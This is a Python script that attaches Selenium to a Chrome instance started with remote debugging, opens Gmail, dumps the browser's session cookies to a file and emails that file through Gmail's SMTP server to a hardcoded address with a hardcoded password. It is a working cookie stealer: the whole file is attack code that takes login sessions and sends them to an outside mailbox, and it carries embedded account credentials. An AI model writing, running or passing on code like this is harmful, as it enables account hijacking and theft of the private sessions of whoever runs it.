from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import subprocess
from threading import *
import time
import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class chrome_setup(Thread):
  def run(self):
    subprocess.run('setx path "%path%;C:\Program Files (x86)\Google\Chrome\Application', shell=True)
    subprocess.run('chrome.exe --remote-debugging-port=9222',shell=True)
    time.sleep(2)

class get_cook(Thread):
  def cookies(self):
    options = Options()
    print('setting options')
    options.add_experimental_option("debuggerAddress", "127.0.0.1:9222")
    print('options set')
    driver = webdriver.Chrome(ChromeDriverManager().install(), chrome_options= options)
    driver.get("http://Gmail.com")
    self.cookie = driver.get_cookies()

  def write_cookie_file(self):
    with open("cookies.txt", "w") as file1:
      for elem in self.cookie:
        file1.write(json.dumps(elem))

  def send_mail(self):

    print('in send mail function')
    mail_content = '''mail from PYTOOLS:
    COOKIES file sended sucessfully
    '''

    print('in mail content')
    sender_address = 'jadujack011@gmail.com'
    sender_pass = 'jadu@123'
    receiver_address = 'jadujack011@gmail.com'

    print('getting password sucessfully')

    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'gmail cookies'

    print('sending gmail')

    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'cookies.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)

    print('encoding gmail')

    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')

  def run(self) :
      self.cookies()
      self.write_cookie_file()
      self.send_mail()

t1 = chrome_setup()
t2 = get_cook()
t1.start()
time.sleep(0.2)
t2.start()




